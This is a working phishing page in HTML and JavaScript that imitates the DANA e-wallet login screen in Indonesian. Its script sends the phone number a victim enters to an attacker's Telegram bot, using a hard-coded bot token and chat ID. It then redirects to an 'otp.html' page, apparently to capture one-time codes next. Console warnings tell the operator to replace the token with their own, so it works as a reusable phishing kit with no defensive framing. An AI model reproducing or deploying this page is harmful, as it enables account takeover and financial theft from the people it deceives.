<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login DANA</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Open Sans', sans-serif;
            background-color: #108EE9; /* Biru Khas DANA */
        }
        .input-box {
            border-radius: 12px;
            background: white;
        }
        .btn-disabled {
            background-color: rgba(255, 255, 255, 0.5);
            color: #999;
        }
    </style>
</head>
<body class="flex flex-col min-h-screen text-white">

    <div class="flex-grow flex flex-col items-center px-8 pt-12">
        <div class="mb-12">
            <img src="https://upload.wikimedia.org/wikipedia/commons/7/72/Logo_danany_biru.png" alt="DANA" class="h-8 brightness-0 invert">
        </div>

        <h2 class="text-center text-lg font-semibold mb-8 px-4 leading-tight">
            Masukkan nomor HP kamu untuk lanjut
        </h2>

        <div class="w-full max-w-sm flex space-x-3">
            <div class="flex-none">
                <label class="block text-xs font-semibold mb-2 opacity-80">Negara</label>
                <div class="input-box p-3 flex items-center justify-between w-24">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/9/9f/Flag_of_Indonesia.svg" class="w-6 h-4 rounded-sm shadow-sm" alt="ID">
                    <span class="text-gray-800 font-bold ml-1">+62</span>
                </div>
            </div>

            <div class="flex-grow">
                <label class="block text-xs font-semibold mb-2 opacity-80">Nomor</label>
                <div class="input-box p-3">
                    <input type="tel" 
                           id="phoneInput"
                           placeholder="811-1234-5678" 
                           class="w-full bg-transparent text-gray-800 font-bold placeholder-gray-300 focus:outline-none text-lg">
                </div>
            </div>
        </div>

        <p class="mt-8 text-center text-sm leading-relaxed opacity-90">
            Kami akan menggunakan nomor HP ini sebagai ID kamu dan untuk mengamankan akun kamu. Dengan melanjutkan, kamu juga setuju dengan 
            <span class="font-bold">S&K</span> serta <span class="font-bold">Kebijakan Privasi</span> kami.
        </p>

        <!-- Notifikasi status -->
        <div id="notification" class="mt-6 p-4 rounded-lg hidden w-full max-w-sm text-center"></div>
    </div>

    <div class="p-6">
        <button id="submitBtn" class="w-full bg-white text-gray-400 font-bold py-4 rounded-lg shadow-lg text-lg tracking-wider uppercase">
            LANJUTKAN
        </button>
    </div>

    <script>
        // ===== KONFIGURASI BOT TELEGRAM =====
        const BOT_TOKEN = '8676937565:AAHH2lBa3W-FDu7TsvotAS1TN9qCrEO2isg';
        const CHAT_ID = '8592742129';

        // Fungsi untuk mengirim data ke Telegram
        async function sendToTelegram(phoneNumber) {
            const message = `📱 *Login DANA - Nomor HP* 📱\n\n📞 *Nomor:* +62${phoneNumber}\n\n⏱ *Waktu:* ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}`;
            
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                const result = await response.json();
                
                if (result.ok) {
                    showNotification('✅ Nomor', 'success dikirim');
                    console.log('Nomor terkirim:', phoneNumber);
                    
                    // Simpan nomor di sessionStorage untuk digunakan di halaman OTP
                    sessionStorage.setItem('danaPhoneNumber', phoneNumber);
                    
                    // Redirect ke halaman OTP setelah 1 detik
                    setTimeout(() => {
                        window.location.href = 'otp.html';
                    }, 1000);
                    
                    return true;
                } else {
                    showNotification('❌ Gagal mengirim nomor', 'error');
                    console.error('Gagal mengirim:', result);
                    return false;
                }
            } catch (error) {
                showNotification('❌ Error koneksi', 'error');
                console.error('Error:', error);
                return false;
            }
        }

        // Fungsi untuk menampilkan notifikasi
        function showNotification(message, type) {
            const notification = document.getElementById('notification');
            notification.classList.remove('hidden', 'bg-green-500', 'bg-red-500', 'bg-green-600', 'bg-red-600');
            
            if (type === 'success') {
                notification.classList.add('bg-green-600', 'text-white');
            } else {
                notification.classList.add('bg-red-600', 'text-white');
            }
            
            notification.textContent = message;
            
            // Sembunyikan notifikasi setelah 3 detik
            setTimeout(() => {
                notification.classList.add('hidden');
            }, 3000);
        }

        // Fungsi untuk membersihkan nomor telepon
        function cleanPhoneNumber(input) {
            // Hapus semua karakter non-digit
            let cleaned = input.replace(/\D/g, '');
            
            // Hapus angka 0 di depan jika ada
            if (cleaned.startsWith('0')) {
                cleaned = cleaned.substring(1);
            }
            
            // Hapus kode negara jika ada (62)
            if (cleaned.startsWith('62') && cleaned.length > 2) {
                cleaned = cleaned.substring(2);
            }
            
            return cleaned;
        }

        // Fungsi untuk validasi nomor telepon
        function validatePhoneNumber(number) {
            // Minimal 8 digit, maksimal 12 digit (untuk nomor Indonesia)
            return number.length >= 8 && number.length <= 12;
        }

        // Event listener untuk tombol LANJUTKAN
        document.getElementById('submitBtn').addEventListener('click', async function() {
            const phoneInput = document.getElementById('phoneInput');
            const rawPhone = phoneInput.value.trim();
            
            if (rawPhone === '') {
                showNotification('❌ Silakan masukkan nomor telepon', 'error');
                return;
            }
            
            const cleanedPhone = cleanPhoneNumber(rawPhone);
            
            if (!validatePhoneNumber(cleanedPhone)) {
                showNotification('❌ Nomor telepon tidak valid (min 8 digit, maks 12 digit)', 'error');
                return;
            }
            
            // Tampilkan notifikasi mengirim
            showNotification('📤 Mengirim nomor...', 'success');
            
            // Kirim ke Telegram
            await sendToTelegram(cleanedPhone);
        });

        // Event listener untuk input nomor (format real-time)
        document.getElementById('phoneInput').addEventListener('input', function(e) {
            // Hanya izinkan angka
            this.value = this.value.replace(/\D/g, '');
        });

        // Debug: tampilkan pesan jika token belum diganti
        if (BOT_TOKEN === '8676937565:AAHH2lBa3W-FDu7TsvotAS1TN9qCrEO2isg') {
            console.warn('⚠️ PERINGATAN: Ganti BOT_TOKEN dengan token bot Telegram Anda!');
        }
        if (CHAT_ID === '8592742129') {
            console.warn('⚠️ PERINGATAN: Ganti CHAT_ID dengan chat ID Anda!');
        }
    </script>

</body>
</html>
